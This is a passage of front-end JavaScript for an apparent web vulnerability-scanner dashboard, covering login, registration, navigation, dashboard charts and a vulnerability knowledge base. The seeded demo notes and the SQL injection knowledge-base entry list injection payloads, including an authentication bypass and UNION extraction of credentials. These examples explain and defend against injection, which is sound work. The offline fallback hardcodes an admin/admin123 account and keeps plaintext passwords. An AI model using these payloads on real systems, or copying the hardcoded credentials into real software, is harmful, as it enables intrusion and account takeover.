      state.user = {
        username: user.username,
        name: user.display_name || user.username,
        email: user.email,
        role: user.role,
        must_change_password: !!user.must_change_password
      };

      if (!state.users.find(x => x.username === user.username)) {
        state.users.push(state.user);
        save();
      }

      document.getElementById('auth-screen').style.display = 'none';
      document.getElementById('app').style.display = 'block';
      const initial = user.username.charAt(0).toUpperCase();
      document.getElementById('ua').textContent = initial;
      document.getElementById('ta').textContent = initial;
      document.getElementById('un').textContent = user.display_name || user.username;
      document.getElementById('un-edit').value = user.username;

      if (user.must_change_password) {
        // Show blocking forced-change modal; initApp runs after password is set
        showForcedPasswordChange();
        toast('Please set a new password to continue.', 'info');
      } else {
        toast('Signed in successfully!', 'success');
        initApp();
      }
    } else {
      _loginAttempts++;
      const errMsg = data.error || 'Login failed';

      if (resp.status === 403 && errMsg.includes('disabled')) {
        showErrorPopup("Account Disabled", "Your account has been temporarily disabled. Please contact an administrator.");
        _loginAttempts--;
      } else if (resp.status === 403 && errMsg.includes('verify your email')) {
        showErrorPopup("Email Verification Required", "Please verify your email address using the verification link sent to your inbox before logging in.");
        _loginAttempts--;
      } else if (resp.status === 429) {
        const retryAfter = resp.headers.get('Retry-After') || '?';
        showErrorPopup("Rate Limited (429)", `Too many login attempts from your IP address. Please wait ${retryAfter}s before attempting to sign in again.`);
      } else if (resp.status === 400 && errMsg.includes('Validation failed')) {
        showErrorPopup("Validation Error", "The login fields did not meet the validation requirements. Please check the highlighted errors.");
        if (data.details) {
          data.details.forEach(err => {
            const parts = err.split(':');
            const f = parts[0].trim();
            const m = parts.slice(1).join(':').trim();
            const map = { 'username': 'lu', 'password': 'lp' };
            const fieldId = map[f];
            if (fieldId) {
              showFieldError(fieldId, m);
            }
          });
        }
      } else {
        // Generic, non-enumerating failure: wrong email, wrong password, AND
        // account lockout all show the SAME message. Never disclose a lockout,
        // an attempt count, the threshold, or a reset email.
        showErrorPopup("Sign-in failed", "Incorrect email or password");
      }
    }
  } catch (err) {
    console.error("Login fetch error:", err);
    showErrorPopup("Server Connection Error", "Cannot connect to the Flask security backend (http://127.0.0.1:5000). Please make sure backend_app.py is running.\n\nDetails: " + err.message + "\n\nFalling back to offline mode.");
    _localLogin(u, p);
  } finally {
    btn.disabled = false;
    btn.innerHTML = origText;
    btn.style.opacity = '1';
  }
}

function _showAttemptCounter() {
  // Intentionally a no-op: surfacing a failed-attempt count, the lockout
  // threshold, or the 15-minute lock leaks account/lockout state. The server
  // already throttles and locks silently; the client must not disclose it.
}

function _localLogin(u, p) {
  if (state.users.length === 0) {
    state.users.push({ username: 'admin', password: 'admin123', name: 'Admin', email: 'admin@vulnscan.local', role: 'admin' });
    save();
  }
  const found = state.users.find(x => x.username === u && x.password === p);
  if (!found) { toast('Incorrect email or password', 'error'); return; }
  if (found.is_active === false) {
    showErrorPopup("Account Disabled", "Your account has been temporarily disabled. Please contact an administrator.");
    return;
  }
  if (found.username === 'admin' && !found.role) {
    found.role = 'admin';
    save();
  }
  state.user = found;
  document.getElementById('auth-screen').style.display = 'none';
  document.getElementById('app').style.display = 'block';
  const initial = u.charAt(0).toUpperCase();
  document.getElementById('ua').textContent = initial;
  document.getElementById('ta').textContent = initial;
  document.getElementById('un').textContent = found.name || found.username;
  document.getElementById('un-edit').value = found.username;
  initApp();
}

async function doRegister() {
  clearErrors('register-form');
  const name = document.getElementById('ru-name').value.trim();
  const email = document.getElementById('ru-email').value.trim();
  const u = document.getElementById('ru').value.trim();
  const p = document.getElementById('rp').value;
  const p2 = document.getElementById('rp2').value;

  let clientValid = true;
  if (!u || u.length < 3) { showFieldError('ru', 'Username must be 3+ characters'); clientValid = false; }
  if (!email) { showFieldError('ru-email', 'Email is required'); clientValid = false; }
  if (!p) { showFieldError('rp', 'Password is required'); clientValid = false; }
  if (p !== p2) { showFieldError('rp2', 'Passwords do not match'); clientValid = false; }
  if (!clientValid) { toast('Please correct the validation errors', 'error'); return; }

  const btn = document.getElementById('rbtn');
  const origText = btn.innerHTML;
  btn.disabled = true;
  btn.innerHTML = '&#x23F3; Creating account...';
  btn.style.opacity = '0.6';

  try {
    const resp = await fetch(`${API_BASE}/api/auth/register`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: u, email: email, password: p, display_name: name || null })
    });
    const data = await resp.json();

    if (resp.ok) {
      if (!state.users.find(x => x.username === u)) {
        state.users.push({ username: u, name: name || u, email, email_verified: false });
        save();
      }
      showErrorPopup("Verification Email Sent", "A verification link has been sent to your email address. Please verify your email to activate your account before logging in.");
      toast('Account created! Verification email sent.', 'success');
      authTab('login');
      document.getElementById('lu').value = u;
      document.getElementById('lp').value = '';
    } else {
      const errMsg = data.error || 'Registration failed';
      if (resp.status === 400 && errMsg.includes('Validation failed')) {
        showErrorPopup("Validation Error", "One or more of the fields are invalid. Please check the highlighted errors on the form.");
        if (data.details) {
          data.details.forEach(err => {
            const parts = err.split(':');
            const f = parts[0].trim();
            const m = parts.slice(1).join(':').trim();
            const map = { 'display_name': 'ru-name', 'email': 'ru-email', 'username': 'ru', 'password': 'rp' };
            const fieldId = map[f];
            if (fieldId) {
              showFieldError(fieldId, m);
            }
          });
        }
      } else if (resp.status === 409) {
        // Server only returns 409 for a username collision now; an already-
        // registered email is masked as success, so we never confirm an email.
        showErrorPopup("Registration unsuccessful", "That username is unavailable. Please choose another.");
      } else {
        showErrorPopup("Registration Failure", errMsg);
      }
    }
  } catch (err) {
    console.error("Register fetch error:", err);
    showErrorPopup("Connection Error", "Cannot connect to the backend server to register.\n\nDetails: " + err.message + "\n\nRegistering account locally for demo purposes.");
    if (state.users.find(x => x.username === u)) { toast('That username is unavailable', 'error'); return; }
    state.users.push({ username: u, password: p, name: name || u, email, email_verified: true });
    save();
    toast('Account created locally. You can now sign in.', 'success');
    authTab('login');
    document.getElementById('lu').value = u;
    document.getElementById('lp').value = '';
  } finally {
    btn.disabled = false;
    btn.innerHTML = origText;
    btn.style.opacity = '1';
  }
}

let adminLogInterval = null;

function doLogout() {
  if (adminLogInterval) {
    clearInterval(adminLogInterval);
    adminLogInterval = null;
  }
  // Disconnect live scan socket and cancel any running scan tracking
  if (_socket) { try { _socket.disconnect(); } catch (e) { } _socket = null; }
  _activeScanId = null;
  state.scanRunning = false;
  // Clear both access and refresh tokens
  localStorage.removeItem('vs_token');
  localStorage.removeItem('vs_refresh_token');

  document.getElementById('profile-modal').style.display = 'none';
  state.user = null;
  document.getElementById('app').style.display = 'none';
  document.getElementById('auth-screen').style.display = 'flex';
  authTab('login');

  const adminSi = document.getElementById('si-admin');
  if (adminSi) adminSi.style.display = 'none';

  toast('Signed out', 'info');
}

async function checkUserSession() {
  if (!state.user) return;
  const token = localStorage.getItem('vs_token');
  if (!token) return;

  try {
    const resp = await fetch(`${API_BASE}/api/auth/me`, {
      headers: { 'Authorization': `Bearer ${token}` }
    });
    if (!resp.ok) {
      const data = await resp.json().catch(() => ({}));
      const errMsg = data.error || '';
      if (resp.status === 403 && errMsg.includes('disabled')) {
        showErrorPopup("Account Disabled", "Your account has been temporarily disabled. Please contact an administrator.");
        doLogout();
      } else if (resp.status === 401) {
        doLogout();
        toast('Session expired. Please sign in again.', 'info');
      }
    }
  } catch (e) {
    console.error("Session check error:", e);
  }
}

// ==================== NAV ====================
const PAGE_TITLES = {
  dashboard: '📊 Dashboard', projects: '📁 Projects', scanner: '🔍 Scanner',
  vulns: '⚠️ Vulnerabilities', reports: '📋 Reports',
  tools: '🧰 Security Tools', notes: '📝 Notes', settings: '⚙️ Settings',
  admin: '🛡️ Admin Panel'
};

async function nav(page) {
  checkUserSession();
  if (page === 'admin') {
    if (!state.user || state.user.role !== 'admin') {
      toast('Access Denied: Admin privileges required', 'error');
      // Re-route to dashboard instead of loading admin panel
      nav('dashboard');
      return;
    }
  }
  if (page !== 'admin' && adminLogInterval) {
    clearInterval(adminLogInterval);
    adminLogInterval = null;
  }
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.si').forEach(s => s.classList.remove('on'));
  const pg = document.getElementById('page-' + page);
  if (pg) pg.classList.add('active');
  const si = document.getElementById('si-' + page);
  if (si) si.classList.add('on');
  document.getElementById('page-title').textContent = PAGE_TITLES[page] || page;
  state.currentPage = page;
  // Inject skeleton loaders while content loads
  const dashStats = document.getElementById('dash-stats');
  if (page === 'dashboard' && dashStats) dashStats.innerHTML = dashboardSkeleton();
  const projList = document.getElementById('proj-list');
  if (page === 'projects' && projList) projList.innerHTML = projectsSkeleton();
  const vulnList = document.getElementById('vuln-list');
  if (page === 'vulns' && vulnList) vulnList.innerHTML = vulnsSkeleton();
  const repList = document.getElementById('report-list');
  if (page === 'reports' && repList) repList.innerHTML = reportsSkeleton();

  // Sync state with backend before rendering database-backed views
  if (['dashboard', 'vulns', 'reports', 'projects'].includes(page)) {
    await syncStateWithBackend();
  }

  if (page === 'dashboard') renderDash();
  if (page === 'vulns') renderVulns();
  if (page === 'notes') renderNotes();
  if (page === 'reports') renderReports();
  if (page === 'projects') renderProjects();
  if (page === 'admin') renderAdmin();
  if (page === 'scanner') { populateScanProjectDropdown(); loadSchedules(); onScanEngineChange(); loadScanHistory(); }
  const qs = document.getElementById('quick-search');
  if (qs) { qs.value = ''; }
}

function toggleSB() {
  document.getElementById('sidebar').classList.toggle('col');
}

// Lightweight client-side filter for the currently visible page.
// Matches table rows and any element tagged with [data-search].
// (quickSearch is defined above with debouncing — this stub kept for backward compat)
function _legacyQuickSearch(q) { quickSearch(q); }

// ==================== INIT ====================
function initApp() {
  checkUserSession();
  // Seed sample data if empty
  if (state.projects.length === 0) seedDemo();
  buildCheckGrid();

  const adminSi = document.getElementById('si-admin');
  if (state.user && state.user.role === 'admin') {
    if (adminSi) adminSi.style.display = 'flex';
  } else {
    if (adminSi) adminSi.style.display = 'none';
  }

  const unRoleEl = document.getElementById('un-role');
  if (unRoleEl) {
    unRoleEl.textContent = (state.user && state.user.role === 'admin') ? 'Administrator' : 'User';
  }

  // Apply ARIA roles/labels to sidebar nav items and modals
  applyARIA();
  // Connect Socket.IO for live scan events
  initSocket();
  // Populate scanner project dropdown
  populateScanProjectDropdown();

  nav('dashboard');
}

function seedDemo() {
  state.projects = [
    { id: 'p1', name: 'WebApp Pentest Q2 2025', desc: 'Main e-commerce platform assessment', created: Date.now() - 86400000 * 5 },
    { id: 'p2', name: 'API Security Review', desc: 'REST API v3 endpoints', created: Date.now() - 86400000 * 2 },
  ];
  state.scans = [
    { id: 's1', url: 'https://shop.example.com', profile: 'full', status: 'completed', ts: Date.now() - 86400000 * 4, vulnCount: 7 },
    { id: 's2', url: 'https://api.example.com', profile: 'quick', status: 'completed', ts: Date.now() - 86400000 * 1, vulnCount: 3 },
  ];
  state.vulns = [
    { id: 'v1', scanId: 's1', title: 'SQL Injection in /search endpoint', severity: 'critical', url: 'https://shop.example.com/search?q=', desc: 'Unparameterized query allows UNION-based SQLi.', ts: Date.now() - 86400000 * 4 },
    { id: 'v2', scanId: 's1', title: 'Stored XSS in product reviews', severity: 'high', url: 'https://shop.example.com/reviews', desc: 'User-supplied input reflected without sanitization.', ts: Date.now() - 86400000 * 4 },
    { id: 'v3', scanId: 's1', title: 'Insecure CORS policy', severity: 'medium', url: 'https://shop.example.com', desc: 'Origin header not validated, allows cross-site requests.', ts: Date.now() - 86400000 * 4 },
    { id: 'v4', scanId: 's1', title: 'Missing HSTS header', severity: 'low', url: 'https://shop.example.com', desc: 'Strict-Transport-Security not set.', ts: Date.now() - 86400000 * 4 },
    { id: 'v5', scanId: 's2', title: 'JWT "none" algorithm accepted', severity: 'critical', url: 'https://api.example.com/auth', desc: 'API accepts unsigned tokens with alg:none.', ts: Date.now() - 86400000 },
    { id: 'v6', scanId: 's2', title: 'BOLA on /users/{id}', severity: 'high', url: 'https://api.example.com/users/', desc: 'Authorization not enforced per-object.', ts: Date.now() - 86400000 },
    { id: 'v7', scanId: 's2', title: 'Server version disclosure', severity: 'info', url: 'https://api.example.com', desc: 'Server: Apache/2.4.51 header exposed.', ts: Date.now() - 86400000 },
  ];
  state.notes = [
    { id: 'n1', title: 'Recon Notes - shop.example.com', body: 'Whois: registered 2019\nTech stack: nginx/1.18, PHP 8.1, MySQL\nSub-domains: admin.shop.example.com (403), cdn.shop.example.com', tag: 'recon', ts: Date.now() - 86400000 * 3 },
    { id: 'n2', title: 'SQLi Payload List', body: "' OR 1=1--\n' UNION SELECT NULL,NULL--\n' AND SLEEP(5)--", tag: 'sqli', ts: Date.now() - 86400000 },
  ];
  save();
}

// ==================== DASHBOARD ====================
// Live clock
(function startClock() {
  function tick() {
    const el = document.getElementById('dash-clock');
    if (el) {
      const now = new Date();
      el.textContent = now.toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit', second: '2-digit' })
        + '  ' + now.toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' });
    }
  }
  tick();
  setInterval(tick, 1000);
})();

// Greeting
function getGreeting() {
  const h = new Date().getHours();
  if (h < 12) return '🌅 Good morning';
  if (h < 17) return '☀️ Good afternoon';
  return '🌙 Good evening';
}

// Canvas donut helper
function drawDonut(canvasId, segments, total) {
  const canvas = document.getElementById(canvasId);
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  const W = canvas.width, H = canvas.height;
  const cx = W / 2, cy = H / 2, r = (Math.min(W, H) / 2) - 6, inner = r * 0.58;
  ctx.clearRect(0, 0, W, H);
  if (!total) {
    ctx.beginPath(); ctx.arc(cx, cy, r, 0, Math.PI * 2);
    ctx.strokeStyle = 'rgba(255,255,255,.07)'; ctx.lineWidth = r - inner; ctx.stroke();
    return;
  }
  let angle = -Math.PI / 2;
  segments.forEach(([color, count]) => {
    if (!count) return;
    const sweep = (count / total) * Math.PI * 2;
    ctx.beginPath(); ctx.moveTo(cx, cy);
    ctx.arc(cx, cy, r, angle, angle + sweep);
    ctx.closePath(); ctx.fillStyle = color; ctx.fill();
    angle += sweep;
  });
  ctx.beginPath(); ctx.arc(cx, cy, inner, 0, Math.PI * 2);
  ctx.fillStyle = getComputedStyle(document.documentElement).getPropertyValue('--panel') || '#0d1424';
  ctx.fill();
}

// Canvas arc gauge
function drawGauge(canvasId, score) {
  const canvas = document.getElementById(canvasId);
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  const W = canvas.width, H = canvas.height;
  const cx = W / 2, cy = H / 2, r = (Math.min(W, H) / 2) - 8;
  ctx.clearRect(0, 0, W, H);
  // Track
  ctx.beginPath(); ctx.arc(cx, cy, r, Math.PI * 0.75, Math.PI * 2.25);
  ctx.strokeStyle = 'rgba(255,255,255,.07)'; ctx.lineWidth = 10; ctx.lineCap = 'round'; ctx.stroke();
  if (!score) return;
  // Value arc (green → yellow → red based on score)
  const pct = score / 100;
  const color = score < 30 ? '#22c55e' : score < 60 ? '#eab308' : score < 80 ? '#f97316' : '#ef4444';
  const endAngle = Math.PI * 0.75 + pct * Math.PI * 1.5;
  ctx.beginPath(); ctx.arc(cx, cy, r, Math.PI * 0.75, endAngle);
  ctx.strokeStyle = color; ctx.lineWidth = 10; ctx.lineCap = 'round'; ctx.stroke();
  // Glow
  ctx.shadowColor = color; ctx.shadowBlur = 12;
  ctx.beginPath(); ctx.arc(cx, cy, r, endAngle - 0.01, endAngle);
  ctx.strokeStyle = color; ctx.lineWidth = 10; ctx.stroke();
  ctx.shadowBlur = 0;
}

function computeRiskScore() {
  const weights = { critical: 30, high: 15, medium: 6, low: 2, info: 0.5 };
  let raw = 0;
  state.vulns.forEach(v => { raw += weights[v.severity] || 0; });
  return Math.min(Math.round(raw), 100);
}

function renderDash() {
  const critCount = state.vulns.filter(v => v.severity === 'critical').length;
  const highCount = state.vulns.filter(v => v.severity === 'high').length;
  const medCount = state.vulns.filter(v => v.severity === 'medium').length;
  const lowCount = state.vulns.filter(v => v.severity === 'low').length;
  const totalVulns = state.vulns.length;
  const completedScans = state.scans.filter(s => s.status === 'completed').length;

  // Greeting & subline
  const nameEl = document.getElementById('dash-greeting');
  const subEl = document.getElementById('dash-subline');
  if (nameEl) nameEl.textContent = getGreeting() + (state.user ? ', ' + (state.user.name || state.user.username) : '') + '.';
  if (subEl) {
    const scanWord = completedScans === 1 ? 'scan' : 'scans';
    const vulnWord = totalVulns === 1 ? 'vulnerability' : 'vulnerabilities';
    subEl.textContent = `${completedScans} ${scanWord} completed · ${totalVulns} ${vulnWord} tracked`;
  }

  // KPI cards
  document.getElementById('dash-stats').innerHTML = `
    <div class="kpi-card cb" onclick="nav('projects')" style="cursor:pointer">
      <div style="display:flex;justify-content:space-between;align-items:flex-start">
        <div><div style="font-size:11px;color:var(--text3);font-weight:700;text-transform:uppercase;letter-spacing:.05em;margin-bottom:6px">Projects</div>
          <div style="font-size:30px;font-weight:900;line-height:1;color:var(--blue)">${state.projects.length}</div></div>
        <div class="kpi-ico">📁</div>
      </div>
      <div style="font-size:11px;color:var(--text3);margin-top:6px">${state.projects.length ? 'Active engagements' : 'Create your first project'}</div>
      <div class="kpi-bar" style="background:var(--blue)"></div>
    </div>
    <div class="kpi-card cg" onclick="nav('scanner')" style="cursor:pointer">
      <div style="display:flex;justify-content:space-between;align-items:flex-start">
        <div><div style="font-size:11px;color:var(--text3);font-weight:700;text-transform:uppercase;letter-spacing:.05em;margin-bottom:6px">Total Scans</div>
          <div style="font-size:30px;font-weight:900;line-height:1;color:var(--green)">${state.scans.length}</div></div>
        <div class="kpi-ico">🔍</div>
      </div>
      <div style="font-size:11px;color:var(--text3);margin-top:6px">${completedScans} completed</div>
      <div class="kpi-bar" style="background:var(--green)"></div>
    </div>
    <div class="kpi-card cr" onclick="currentScanId=null;nav('vulns')" style="cursor:pointer">
      <div style="display:flex;justify-content:space-between;align-items:flex-start">
        <div><div style="font-size:11px;color:var(--text3);font-weight:700;text-transform:uppercase;letter-spacing:.05em;margin-bottom:6px">Critical</div>
          <div style="font-size:30px;font-weight:900;line-height:1;color:var(--red)">${critCount}</div></div>
        <div class="kpi-ico">🔴</div>
      </div>
      <div style="font-size:11px;color:var(--text3);margin-top:6px">${critCount ? '⚠️ Needs immediate action' : '✅ None found'}</div>
      <div class="kpi-bar" style="background:var(--red)"></div>
    </div>
    <div class="kpi-card co" onclick="currentScanId=null;nav('vulns')" style="cursor:pointer">
      <div style="display:flex;justify-content:space-between;align-items:flex-start">
        <div><div style="font-size:11px;color:var(--text3);font-weight:700;text-transform:uppercase;letter-spacing:.05em;margin-bottom:6px">High</div>
          <div style="font-size:30px;font-weight:900;line-height:1;color:var(--orange)">${highCount}</div></div>
        <div class="kpi-ico">🟠</div>
      </div>
      <div style="font-size:11px;color:var(--text3);margin-top:6px">${highCount ? highCount + ' high severity issues' : '✅ None found'}</div>
      <div class="kpi-bar" style="background:var(--orange)"></div>
    </div>
  `;

  // Risk score
  const riskScore = computeRiskScore();
  setTimeout(() => {
    drawGauge('risk-gauge', riskScore);
    const valEl = document.getElementById('risk-score-val');
    const lbEl = document.getElementById('risk-label');
    const dtEl = document.getElementById('risk-detail');
    if (valEl) valEl.textContent = riskScore;
    if (lbEl) {
      const [label, bg, color] =
        riskScore === 0 ? ['No Risk', 'rgba(34,197,94,.15)', '#22c55e'] :
          riskScore < 30 ? ['Low Risk', 'rgba(34,197,94,.15)', '#22c55e'] :
            riskScore < 60 ? ['Medium', 'rgba(234,179,8,.15)', '#eab308'] :
              riskScore < 80 ? ['High Risk', 'rgba(249,115,22,.15)', '#f97316'] :
                ['Critical', 'rgba(239,68,68,.15)', '#ef4444'];
      lbEl.textContent = label;
      lbEl.style.background = bg;
      lbEl.style.color = color;
    }
    if (dtEl) dtEl.textContent = riskScore === 0 ? 'No issues detected yet' : critCount + ' critical, ' + highCount + ' high issues';
  }, 50);

  // Severity donut
  const sevData = [
    ['#ef4444', critCount], ['#f97316', highCount],
    ['#eab308', medCount], ['#6366f1', lowCount],
    ['#22c55e', state.vulns.filter(v => v.severity === 'info').length]
  ];
  setTimeout(() => {
    drawDonut('sev-donut', sevData, totalVulns);
    const tot = document.getElementById('donut-total');
    if (tot) tot.textContent = totalVulns;
  }, 50);

  // Severity legend bars
  const sev = ['critical', 'high', 'medium', 'low', 'info'];
  const sevColors = { critical: 'var(--red)', high: 'var(--orange)', medium: 'var(--yellow)', low: 'var(--blue)', info: 'var(--green)' };
  const sevLabels = { critical: 'Critical', high: 'High', medium: 'Medium', low: 'Low', info: 'Info' };
  document.getElementById('dash-sev').innerHTML = sev.map(s => {
    const cnt = state.vulns.filter(v => v.severity === s).length;
    const pct = totalVulns ? Math.round(cnt / totalVulns * 100) : 0;
    return `<div style="margin-bottom:9px">
      <div style="display:flex;justify-content:space-between;font-size:12px;margin-bottom:3px">
        <span style="color:var(--text2);font-weight:500">${sevLabels[s]}</span>
        <span style="font-weight:700;color:${sevColors[s]}">${cnt}</span>
      </div>
      <div style="background:rgba(255,255,255,.06);border-radius:4px;height:5px;overflow:hidden">
        <div style="width:${pct}%;height:100%;background:${sevColors[s]};border-radius:4px;transition:.6s .1s"></div>
      </div>
    </div>`;
  }).join('');

  // Activity feed
  const events = [
    ...state.scans.map(s => ({ ts: s.ts, icon: '🔍', color: '#6366f1', msg: `Scan on <strong>${s.url}</strong>`, sub: s.vulnCount + ' issues found' })),
    ...state.vulns.filter(v => v.severity === 'critical').map(v => ({ ts: v.ts, icon: '🔴', color: '#ef4444', msg: `<strong>Critical:</strong> ${v.title}`, sub: '' })),
    ...state.projects.map(p => ({ ts: p.created, icon: '📁', color: '#22c55e', msg: `Project created: <strong>${p.name}</strong>`, sub: '' })),
  ].sort((a, b) => b.ts - a.ts).slice(0, 8);

  document.getElementById('dash-activity').innerHTML = events.length
    ? events.map(e => `<div class="act-item">
        <div class="act-dot" style="background:${e.color}"></div>
        <div style="flex:1;min-width:0">
          <div style="color:var(--text2);line-height:1.4">${e.msg}</div>
          ${e.sub ? `<div style="font-size:11px;color:var(--text3)">${e.sub}</div>` : ''}
          <div style="font-size:10px;color:var(--text3);margin-top:1px">${fmtDate(e.ts)}</div>
        </div>
      </div>`).join('')
    : '<div class="ph" style="padding:20px;font-size:12px">No activity yet</div>';

  // Recent scans table
  const recentScans = [...state.scans].sort((a, b) => b.ts - a.ts).slice(0, 5);
  document.getElementById('dash-scans').innerHTML = recentScans.length
    ? `<table class="tbl"><thead><tr><th>URL</th><th>Profile</th><th>Issues</th><th>Status</th><th>Date</th></tr></thead><tbody>
        ${recentScans.map(s => `<tr>
          <td style="font-family:var(--mono);font-size:11.5px;max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${s.url}</td>
          <td><span style="font-size:11px;text-transform:capitalize;color:var(--text2)">${s.profile}</span></td>
          <td><span class="badge ${s.vulnCount > 0 ? (s.vulnCount >= 5 ? 'bc' : 'bh') : 'bi'}">${s.vulnCount}</span></td>
          <td><span class="badge bi">✓ done</span></td>
          <td style="color:var(--text3);font-size:11px">${fmtDate(s.ts)}</td>
        </tr>`).join('')}
       </tbody></table>`
    : `<div class="empty" style="padding:30px"><div class="em-ico">🔍</div><div class="em-h">No scans yet</div><div class="em-p">Launch your first scan to see results here</div><button class="btn btn-p btn-sm" onclick="nav('scanner')">Start Scanning</button></div>`;

  // Top vulnerabilities (critical + high)
  const topVulns = state.vulns
    .filter(v => v.severity === 'critical' || v.severity === 'high')
    .sort((a, b) => { const o = { critical: 0, high: 1 }; return o[a.severity] - o[b.severity] || b.ts - a.ts; })
    .slice(0, 5);
  const tvEl = document.getElementById('dash-top-vulns');
  tvEl.innerHTML = topVulns.length
    ? topVulns.map(v => `<div class="top-vuln-row">
        <span class="badge ${v.severity === 'critical' ? 'bc' : 'bh'}" style="flex-shrink:0">${v.severity}</span>
        <span style="flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-weight:600;font-size:12.5px">${v.title}</span>
        <button class="btn btn-d btn-xs" style="flex-shrink:0" onclick="deleteVuln('${v.id}');renderDash()">✕</button>
      </div>`).join('')
    : `<div class="empty" style="padding:30px"><div class="em-ico">✅</div><div class="em-h">All clear</div><div class="em-p">No critical or high severity findings</div></div>`;
}

function fmtDate(ts) {
  return new Date(ts).toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' });
}

// ==================== PROJECTS ====================
function renderProjects() {
  const list = document.getElementById('proj-list');
  if (!state.projects.length) {
    list.innerHTML = `<div class="empty"><div class="em-ico">📁</div><div class="em-h">No projects yet</div><div class="em-p">Create a project to organise your assessments</div><button class="btn btn-p" onclick="openPM()">+ New Project</button></div>`;
    return;
  }
  list.innerHTML = state.projects.map(p => {
    const pScans = state.scans.filter(s => s.projectId === p.id);
    return `<div class="card" style="margin-bottom:12px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px">
      <div><div style="font-size:15px;font-weight:700">${p.name}</div><div style="font-size:12px;color:var(--text3);margin-top:2px">${p.desc || ''}</div><div style="font-size:11px;color:var(--text3);margin-top:4px">Created ${fmtDate(p.created)} &nbsp;·&nbsp; ${pScans.length} scan(s)</div></div>
      <button class="btn btn-d btn-sm" onclick="deleteProject('${p.id}')">🗑 Delete</button>
    </div>`;
  }).join('');
}

function openPM() { document.getElementById('pmodal').style.display = 'flex'; document.getElementById('pname').value = ''; document.getElementById('pdesc').value = ''; }
function closePM() { document.getElementById('pmodal').style.display = 'none'; }

function createP() {
  const name = document.getElementById('pname').value.trim();
  if (!name) { toast('Project name is required', 'error'); return; }
  state.projects.push({ id: 'p' + Date.now(), name, desc: document.getElementById('pdesc').value.trim(), created: Date.now() });
  save(); closePM(); renderProjects(); toast('Project created!', 'success');
}

function deleteProject(id) {
  state.projects = state.projects.filter(p => p.id !== id);
  save(); renderProjects(); toast('Project deleted', 'info');
}

// ==================== SCANNER ====================
const CHECK_LIST = [
  { id: 'sqli', label: '💉 SQL Injection' }, { id: 'xss', label: '🔥 XSS' },
  { id: 'csrf', label: '🔄 CSRF' }, { id: 'lfi', label: '📂 Path Traversal' },
  { id: 'ssrf', label: '🌐 SSRF' }, { id: 'auth', label: '🔐 Auth Issues' },
  { id: 'headers', label: '📋 HTTP Headers' }, { id: 'tls', label: '🔒 TLS/SSL' },
];

function buildCheckGrid() {
  const g = document.getElementById('chk-grid');
  if (!g) return;
  g.innerHTML = CHECK_LIST.map(c =>
    `<label class="chk-item"><input type="checkbox" value="${c.id}" checked> ${c.label}</label>`
  ).join('');
}

async function checkZapHealth() {
  const el = document.getElementById('zap-health-status');
  if (!el) return;
  el.style.display = 'block';
  el.style.color = 'var(--text3)';
  el.innerHTML = '⚡ Checking OWASP ZAP connection...';
  try {
    const resp = await apiFetch(`${API_BASE}/api/zap/health`);
    const data = await resp.json();
    if (resp.ok && data.zap_reachable) {
      el.style.color = 'var(--green)';
      el.innerHTML = `🟢 ZAP is Online (v${data.zap_version || 'unknown'})`;
    } else {
      el.style.color = 'var(--red)';
      el.innerHTML = `🔴 ZAP Offline: ${data.message || 'Tunnel not running'}`;
    }
  } catch (err) {
    el.style.color = 'var(--red)';
    el.innerHTML = '🔴 ZAP check failed: Server offline';
  }
}

function onScanEngineChange() {
  const engine = document.getElementById('scan-engine-sel') ? document.getElementById('scan-engine-sel').value : 'native';
  const el = document.getElementById('zap-health-status');
  if (engine === 'zap') {
    checkZapHealth();
  } else {
    if (el) el.style.display = 'none';
  }
}

// ==================== VULNERABILITIES ====================
const BADGE_MAP = { critical: 'bc', high: 'bh', medium: 'bm', low: 'bl', info: 'bi' };

// ==================== VULN KNOWLEDGE BASE ====================
const VULN_KB = {
  sqli: {
    name: 'SQL Injection',
    icon: '💉',
    cwe: 'CWE-89',
    owasp: 'A03:2021',
    description: 'SQL Injection occurs when user-supplied input is incorporated into a database query without proper sanitisation or parameterisation. An attacker can manipulate the query logic to bypass authentication, extract data, modify records, or execute OS commands.',
    howItWorks: [
      'Application receives user input (e.g. login form, search box)',
      'Input is directly concatenated into a SQL query string',
      'Attacker injects SQL metacharacters to alter query logic',
      'Database executes the modified query and returns attacker-controlled results'
    ],
    payloads: [
      { label: 'Auth Bypass', code: "' OR '1'='1' --" },
      { label: 'UNION Extract', code: "' UNION SELECT username,password,NULL FROM users --" },
      { label: 'Time-based Blind', code: "'; IF (1=1) WAITFOR DELAY '0:0:5' --" },
      { label: 'Boolean Blind', code: "' AND 1=1 -- (true) / ' AND 1=2 -- (false)" }
    ],
    queryDemo: {
      before: `SELECT * FROM users\n  WHERE username = '<span class="hi pay">[INPUT]</span>'\n  AND password = '...'`,
      after: `SELECT * FROM users\n  WHERE username = '<span class="hi pay">\\' OR \\'1\\'=\\'1\\' --</span>'\n  <span class="cmt">-- password check is commented out, all rows returned</span>`,
    },
    fixes: [
      { icon: '✅', text: 'Use parameterised queries / prepared statements (never concatenate input into SQL)' },
      { icon: '✅', text: 'Apply an ORM (Hibernate, SQLAlchemy, ActiveRecord) that parameterises by default' },
      { icon: '✅', text: 'Whitelist and validate input types — reject anything that doesn\'t match expected format' },
      { icon: '✅', text: 'Run DB user with least-privilege; never connect as root/sa' },
      { icon: '✅', text: 'Enable WAF rules for SQLi patterns as a defence-in-depth layer' }
    ],
    references: [{ label: 'OWASP SQLi', url: 'https://owasp.org/www-community/attacks/SQL_Injection' }, { label: 'PortSwigger SQLi Labs', url: 'https://portswigger.net/web-security/sql-injection' }]
  },
  xss: {
    name: 'Cross-Site Scripting (XSS)',
    icon: '🔥',
    cwe: 'CWE-79',
    owasp: 'A03:2021',
    description: 'XSS allows attackers to inject malicious scripts into web pages viewed by other users. The browser trusts the script because it appears to come from the legitimate site. Variants include Reflected (non-persistent), Stored (persistent), and DOM-based.',
    howItWorks: [
      'Application takes user input and reflects or stores it in a page',
      'Output is rendered without HTML-encoding special characters',
